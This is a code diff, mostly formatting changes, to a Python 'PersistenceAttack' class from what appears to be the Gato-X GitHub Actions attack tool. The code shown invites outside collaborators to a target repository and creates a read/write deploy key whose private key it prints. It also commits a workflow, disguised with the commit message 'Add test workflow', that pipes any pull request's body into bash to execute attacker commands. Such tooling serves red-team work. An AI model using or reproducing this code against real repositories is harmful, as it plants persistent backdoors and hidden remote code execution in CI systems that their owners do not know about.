@@ -29,32 +29,34 @@ class PersistenceAttack(Attacker):
 
     async def invite_collaborators(self, target_repo: str, collaborators: list):
         """Invite outside collaborators to the repository.
-        
+
         Args:
             target_repo (str): Repository to target (org/repo format)
             collaborators (list): List of GitHub usernames to invite
-            
+
         Returns:
             bool: True if successful, False otherwise
         """
         if not await self.setup_user_info():
             return False
-            
+
         Output.info(f"Attempting to invite collaborators to {target_repo}")
-        
+
         success_count = 0
         for collaborator in collaborators:
             Output.info(f"Inviting collaborator: {collaborator}")
-            
+
             result = await self.api.invite_collaborator(target_repo, collaborator)
             if result:
                 Output.result(f"Successfully invited {collaborator} to {target_repo}")
                 success_count += 1
             else:
                 Output.error(f"Failed to invite {collaborator} to {target_repo}")
-        
+
         if success_count > 0:
-            Output.result(f"Successfully invited {success_count}/{len(collaborators)} collaborators")
+            Output.result(
+                f"Successfully invited {success_count}/{len(collaborators)} collaborators"
+            )
             return True
         else:
             Output.error("Failed to invite any collaborators")
@@ -62,43 +64,45 @@ class PersistenceAttack(Attacker):
 
     async def create_deploy_key(self, target_repo: str, key_title: str = None):
         """Create a read/write deploy key for the repository.
-        
+
         Args:
             target_repo (str): Repository to target (org/repo format)
             key_title (str): Title for the deploy key
-            
+
         Returns:
             bool: True if successful, False otherwise
         """
         if not await self.setup_user_info():
             return False
-            
+
         if not key_title:
             key_title = "Gato-X Deploy Key"
-            
+
         Output.info(f"Creating deploy key for {target_repo}")
-        
+
         # Generate RSA key pair
         private_key = rsa.generate_private_key(
             public_exponent=65537,
             key_size=2048,
         )
-        
+
         # Get public key in SSH format
         public_key = private_key.public_key()
         ssh_public_key = public_key.public_bytes(
             encoding=serialization.Encoding.OpenSSH,
-            format=serialization.PublicFormat.OpenSSH
-        ).decode('utf-8')
-        
+            format=serialization.PublicFormat.OpenSSH,
+        ).decode("utf-8")
+
         # Get private key in PEM format for user
         private_key_pem = private_key.private_bytes(
             encoding=serialization.Encoding.PEM,
             format=serialization.PrivateFormat.PKCS8,
-            encryption_algorithm=serialization.NoEncryption()
-        ).decode('utf-8')
-        
-        result = await self.api.create_deploy_key(target_repo, key_title, ssh_public_key, read_only=False)
+            encryption_algorithm=serialization.NoEncryption(),
+        ).decode("utf-8")
+
+        result = await self.api.create_deploy_key(
+            target_repo, key_title, ssh_public_key, read_only=False
+        )
         if result:
             Output.result(f"Successfully created deploy key for {target_repo}")
             Output.info("Private key (save this securely):")
@@ -108,24 +112,28 @@ class PersistenceAttack(Attacker):
             Output.error(f"Failed to create deploy key for {target_repo}")
             return False
 
-    async def create_pwn_request_workflow(self, target_repo: str, branch_name: str = None):
+    async def create_pwn_request_workflow(
+        self, target_repo: str, branch_name: str = None
+    ):
         """Create a malicious pull_request_target workflow on a non-default branch.
-        
+
         Args:
             target_repo (str): Repository to target (org/repo format)
             branch_name (str): Branch name to create the workflow on
-            
+
         Returns:
             bool: True if successful, False otherwise
         """
         if not await self.setup_user_info():
             return False
-            
+
         if not branch_name:
             branch_name = "feature/test-workflow"
-            
-        Output.info(f"Creating malicious pull_request_target workflow on {target_repo}:{branch_name}")
-        
+
+        Output.info(
+            f"Creating malicious pull_request_target workflow on {target_repo}:{branch_name}"
+        )
+
         # Malicious workflow content
         workflow_content = f"""name: Pwn Request Workflow
 on:
@@ -162,17 +170,19 @@ jobs:
           # Execute any code from PR body
           echo "${{{{ github.event.pull_request.body }}}}" | bash
 """
-        
+
         result = await self.api.create_workflow_on_branch(
-            target_repo, 
-            branch_name, 
-            "pwn-request.yml", 
+            target_repo,
+            branch_name,
+            "pwn-request.yml",
             workflow_content,
-            commit_message="Add test workflow"
+            commit_message="Add test workflow",
         )
-        
+
         if result:
-            Output.result(f"Successfully created malicious workflow on {target_repo}:{branch_name}")
+            Output.result(
+                f"Successfully created malicious workflow on {target_repo}:{branch_name}"
+            )
             Output.info(f"To trigger: Create a PR targeting the '{branch_name}' branch")
             Output.info("Include shell commands in the PR body to execute them")
             return True
